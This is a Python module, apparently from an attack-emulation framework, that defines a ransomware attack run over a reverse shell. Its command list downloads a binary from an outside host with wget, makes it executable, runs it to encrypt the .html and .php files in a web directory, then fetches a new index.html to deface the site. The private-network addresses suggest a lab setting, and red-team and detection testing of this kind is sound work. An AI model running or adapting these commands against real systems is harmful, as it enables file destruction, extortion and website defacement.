import base64
import os
from urllib.parse import urlparse

from attacks import AttackInfo
from attacks.reverse_shell_attack_options import ReverseShellAttack, ReverseShellAttackOptions


class RansomwareAttackOptions(ReverseShellAttackOptions):
    ransomware: str = "Ransomware URL"
    directory = "Target Directory on the Client"

    def _set_defaults(self) -> None:
        super()._set_defaults()
        self.lhost = "172.18.0.3"
        self.lport = "4444"
        self.ransomware = "http://172.18.1.1/ransom-encrypt"
        self.directory = "/var/www/html"


class RansomwareAttack(ReverseShellAttack):
    info: AttackInfo = AttackInfo(
        name="impact_ransomware",
        description="Ransomware encrypts files with .html and .php suffixes",
    )
    options_class = RansomwareAttackOptions

    def run(self) -> None:
        self.connect_to_target()
        with self.check_printed("Your files have been encrypted"):
            with self.wrap_ssh_exceptions():
                self.exec_commands_on_shell(self.commands)

    def _append_command(self):
        directory = self.options.directory
        parsed_url = urlparse(self.options.ransomware)
        filename = parsed_url.path.split("/")[-1]
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        index = "index.html"
        self.commands.extend([
            f"wget {self.options.ransomware} -O {directory}/{filename}",
            f"cd {directory}",
            f"chmod +x {filename}",
            f"./{filename} -e html",
            f"./{filename} -e php",
            f"wget {base_url}/{index} -O {directory}/{index}", # modify index.html
            f"curl http://localhost/" # get modified website
        ])
